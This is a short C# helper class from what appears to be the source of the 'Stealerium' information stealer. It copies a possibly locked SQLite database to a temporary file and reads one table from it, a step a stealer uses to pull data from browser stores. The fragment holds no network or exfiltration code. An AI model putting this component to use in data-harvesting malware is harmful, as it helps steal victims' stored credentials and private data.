using System.IO;

namespace Stealerium.Helpers;

public sealed class SqlReader
{
	public static SqLite ReadTable(string database, string table)
	{
		if (!File.Exists(database))
		{
			return null;
		}
		string text = Path.GetTempFileName() + ".dat";
		File.Copy(database, text);
		SqLite sqLite = new SqLite(text);
		sqLite.ReadTable(table);
		File.Delete(text);
		if (sqLite.GetRowCount() != 65536)
		{
			return sqLite;
		}
		return null;
	}
}
